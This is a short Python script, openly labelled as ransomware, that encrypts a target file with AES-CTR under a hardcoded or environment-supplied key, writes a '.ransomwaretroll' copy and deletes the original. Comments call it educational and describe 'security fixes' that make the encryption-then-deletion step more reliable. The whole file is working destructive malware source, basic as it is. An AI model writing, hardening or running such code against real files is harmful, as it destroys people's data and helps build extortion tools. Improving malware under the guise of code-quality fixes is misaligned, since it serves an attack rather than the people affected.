import os
import sys
import pyaes

# Security Fix: Allow obtaining encryption key from environment variable to avoid hardcoded secrets in source code.
# The key must be 16, 24, or 32 bytes long for AES.
DEFAULT_KEY = b"testeransomwares"  # 16-byte key for educational fallback

def get_encryption_key() -> bytes:
    key_env = os.getenv("RANSOMWARE_KEY")
    if key_env:
        key_bytes = key_env.encode('utf-8')
        if len(key_bytes) in (16, 24, 32):
            return key_bytes
        else:
            raise ValueError(f"Invalid key length ({len(key_bytes)} bytes). Key must be 16, 24, or 32 bytes.")
    return DEFAULT_KEY

def encrypt_file(file_name: str = "text.txt", key: bytes = None) -> str:
    if key is None:
        key = get_encryption_key()

    if not os.path.exists(file_name):
        raise FileNotFoundError(f"Input file '{file_name}' not found.")

    # Fix: Use context manager ('with') for safe file reading
    with open(file_name, "rb") as file:
        file_data = file.read()

    # Initialize AES cipher in Counter mode
    aes = pyaes.AESModeOfOperationCTR(key)
    crypto_data = aes.encrypt(file_data)

    encrypted_filename = file_name + ".ransomwaretroll"

    # Fix: Write output file safely using context manager before removing the original
    with open(encrypted_filename, "wb") as new_file:
        new_file.write(crypto_data)

    # Fix: Safely remove original file only AFTER encrypted file is written successfully
    os.remove(file_name)
    return encrypted_filename

if __name__ == "__main__":
    target_file = sys.argv[1] if len(sys.argv) > 1 else "text.txt"
    try:
        out_file = encrypt_file(target_file)
        print(f"File successfully encrypted: {out_file}")
    except Exception as e:
        print(f"Encryption failed: {e}", file=sys.stderr)
